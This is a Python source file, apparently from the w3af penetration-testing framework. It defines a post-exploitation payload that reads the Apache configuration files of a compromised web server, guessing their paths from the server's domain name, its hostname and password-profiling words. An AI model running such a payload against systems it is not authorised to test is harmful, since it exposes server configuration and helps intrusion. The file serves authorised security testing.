import w3af.core.data.kb.knowledge_base as kb
from w3af.plugins.attack.payloads.base_payload import Payload
from w3af.core.ui.console.tables import table


class apache_config_files(Payload):
    """
    This payload finds readable Apache configuration files
    """
    def fname_generator(self, apache_dir):
        files = []

        files.append('apache2.conf')
        files.append('httpd.conf')
        files.append('magic')
        files.append('envvars')
        files.append('ports.conf')
        files.append('conf.d/security')
        files.append('sites-available/default')
        files.append('sites-available/default-ssl')
        files.append('conf.d/subversion.conf')
        files.append('workers.properties')

        if apache_dir:
            for directory in apache_dir:
                for filename in files:
                    yield directory + filename

                profiled_words_list = kb.kb.raw_read('password_profiling',
                                                     'password_profiling')
                domain_name = self.exec_payload('domainname')['domain_name']
                hostname = self.exec_payload('hostname')['hostname']

                extras = []
                extras.append(domain_name)
                extras.extend(hostname)
                if profiled_words_list is not None:
                    extras.extend(profiled_words_list)
                extras = list(set(extras))
                extras = [i for i in extras if i != '']

                for possible_domain in extras:
                    yield directory + 'sites-enabled/' + possible_domain.lower()

                yield directory + 'sites-enabled/' + self.shell.get_url().get_domain()

    def api_read(self):
        result = {}
        result['apache_config'] = {}

        apache_dirs = self.exec_payload(
            'apache_config_directory')['apache_directory']
        fname_iter = self.fname_generator(apache_dirs)

        for file_path, content in self.read_multi(fname_iter):
            if content:
                result['apache_config'][file_path] = content

        return result

    def run_read(self):
        api_result = self.api_read()

        if not api_result['apache_config']:
            return 'Apache configuration files not found.'
        else:
            rows = []
            rows.append(['Apache configuration files'])
            rows.append([])
            for key_name in api_result:
                for filename, file_content in api_result[key_name].items():
                    rows.append([filename, ])
            result_table = table(rows)
            result_table.draw(80)
            return rows
